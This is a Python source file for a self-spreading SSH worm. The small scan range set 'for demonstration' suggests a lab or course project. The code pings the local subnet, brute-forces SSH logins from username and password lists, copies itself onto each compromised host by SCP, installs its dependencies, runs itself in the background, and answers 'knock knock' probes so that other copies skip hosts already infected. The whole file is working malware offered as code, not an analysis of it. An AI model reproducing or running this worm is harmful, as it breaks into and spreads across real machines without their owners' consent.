from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException
from paramiko.ssh_exception import NoValidConnectionsError
from scp import SCPClient
import subprocess
import itertools
import socket
import time
import concurrent.futures
from threading import Thread


# Determines whether this combination of hostname, username, and password
# validates against the ssh server
def is_ssh_open(hostname, username, password):
    with SSHClient() as ssh:
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        try:
            ssh.connect(
                hostname=hostname,
                username=username,
                password=password,
                port=22,
                timeout=1,
            )
        except socket.timeout:
            ssh.close()
            return False
        except AuthenticationException:
            ssh.close()
            return False
        except NoValidConnectionsError:
            ssh.close()
            return False
        except SSHException:
            ssh.close()
            time.sleep(120)
            return is_ssh_open(hostname, username, password)
        else:
            ssh.close()
            return True


# Uses ping to determine hosts that are responding.
def ping(host):
    command = ["ping", "-c", "1", host]
    result = (
        subprocess.call(
            command,
            # stdout=subprocess.DEVNULL,
            # stderr=subprocess.DEVNULL
        )
        == 0
    )
    return (host, result)


# Checks if host at ip_address has already been infected. It sends a specific
# message to the host.  If the host responds with specific response then it has
# already been infected
def check_infected(ip_address):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((ip_address, 50000))
        client_socket.send("knock knock".encode())
        infected_status = client_socket.recv(8).decode() == "infected"
        client_socket.close
        return infected_status
    except:
        return False


# Find its own local address and uses that scan local ip pool using ping to
# determine targets that are up.
#  Uses multi-threading to accomplish this asynchronously. Finally excludes its
# own ip address from possible results.
def find_local_targets():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    my_local_ip = str(s.getsockname()[0]).split(".")

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        # TODO: Change back to 0, 256 after demonstration
        for i in range(0, 6):
            # Attacks local subnet
            # i.e. 192.168.1.0/24 assuming
            new_ip = f"{my_local_ip[0]}.{my_local_ip[1]}.{my_local_ip[2]}.{i}"
            futures.append(executor.submit(ping, host=new_ip))

        done, not_done = concurrent.futures.wait(
            futures, return_when=concurrent.futures.ALL_COMPLETED
        )

        return [
            ip_address
            for (ip_address, live) in [d.result() for d in done]
            if live and not check_infected(ip_address) and ip_address != my_local_ip
        ]


# This function will run in a separate thread in a loop.  It is waiting for a
# knock knock message to which it will respond with infected.  This will inform
# other worms that this host is infected already saving the bruteforcing efforts.
def infected_communicator():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 50000))
    server_socket.listen(5)
    while True:
        conn, addr = server_socket.accept()
        while True:
            data = conn.recv(11)
            if not data:
                break
            if data.decode() == "knock knock":
                conn.send("infected".encode())
        conn.close()


# Creates the cross product between usernames and passwords.
def get_credentials():
    credentials = []

    with open("usernames.txt", "r") as usernames:
        with open("passwords.txt", "r") as passwords:
            credentials = [
                (username.strip(), password.strip())
                for (username, password) in itertools.product(usernames, passwords)
            ]
    return credentials


# Uses credentials to bruteforcing ssh.  Once access is granted, it copies the
# worm.  Installs dependencies and runs in the background.
def hack_targets(ip_addresses):
    credentials = get_credentials()

    for ip_address in ip_addresses:
        for (user, pwd) in credentials:
            status = is_ssh_open(ip_address, user, pwd)
            if status:
                with SSHClient() as ssh:
                    ssh.set_missing_host_key_policy(AutoAddPolicy())

                    try:
                        ssh.connect(
                            hostname=ip_address,
                            username=user,
                            password=pwd,
                            port=22,
                            timeout=1,
                        )
                        with SCPClient(ssh.get_transport()) as scp:
                            scp.put(
                                [
                                    "ssh_worm.py",
                                    "usernames.txt",
                                    "passwords.txt",
                                    "requirements.txt",
                                ]
                            )
                        cmd = "python -m ensurepip --upgrade"
                        stdin, stdout, stderr = ssh.exec_command(cmd)
                        print(stdout.readlines())

                        cmd = "python -m pip install -r requirements.txt"
                        stdin, stdout, stderr = ssh.exec_command(cmd)
                        print(stdout.readlines())

                        cmd = "nohup python ssh_worm.py &"
                        stdin, stdout, stderr = ssh.exec_command(cmd)
                        print(stdout.readlines())

                    except:
                        pass
                break


# Runs the communicator in a separate thread.
thread = Thread(target=infected_communicator)
thread.start()

targets = find_local_targets()

hack_targets(targets)

thread.join()
